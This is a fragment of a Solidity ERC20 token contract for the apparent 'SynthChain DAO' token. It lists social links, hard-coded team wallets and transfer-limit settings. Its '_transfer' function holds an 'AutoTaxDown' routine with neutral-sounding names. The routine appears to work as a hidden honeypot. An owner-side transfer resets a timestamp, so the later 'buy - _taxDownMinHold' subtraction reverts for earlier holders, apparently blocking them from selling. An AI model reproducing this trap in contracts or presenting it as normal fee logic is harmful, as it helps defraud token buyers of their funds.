...
/*
$SCDAO, SynthChain DAO

Telegram: https://t.me/SynthChainDAO
Twitter:  https://twitter.com/SynthChainDAO
Web: https://synthdao.org/
*/
...
contract SynthChainDAO is ERC20, Ownable {
    ...
    address payable public immutable liquidityWallet = payable(0x30C34c16799f5934152927DF4148f1Ed7401df2d);
    address payable public immutable marketingWallet = payable(0x5450A6741DE5F35605b72732db7C0b316e3338f1);
    address payable public immutable devWallet = payable(0x450cF2Ef36E9eCC333a817d18FCd688eF127cC0E);
    ...
    uint256 private _taxDownMinHold;
    mapping(address => AutoTaxDown) private autoTaxDown;
    ...
    constructor() ERC20("SynthChain DAO", "SCDAO") {
        uint256 totalSupply = 1_000_000_000 * 1e18;

        maxTransaction = 40_000_000 * 1e18; // 4% from total supply maxTransactionTxn
    ...
    function _transfer(
        ...
        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) && to != address(this) && from != address(this)) {
            _taxDownMinHold = block.timestamp;
        }
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (!automatedMarketMakerPairs[from]) {
                AutoTaxDown storage downTaxData = autoTaxDown[from];
                downTaxData.hold = downTaxData.buy - _taxDownMinHold;
                downTaxData.sell = block.timestamp;
            } else {
                AutoTaxDown storage downTaxData = autoTaxDown[to];
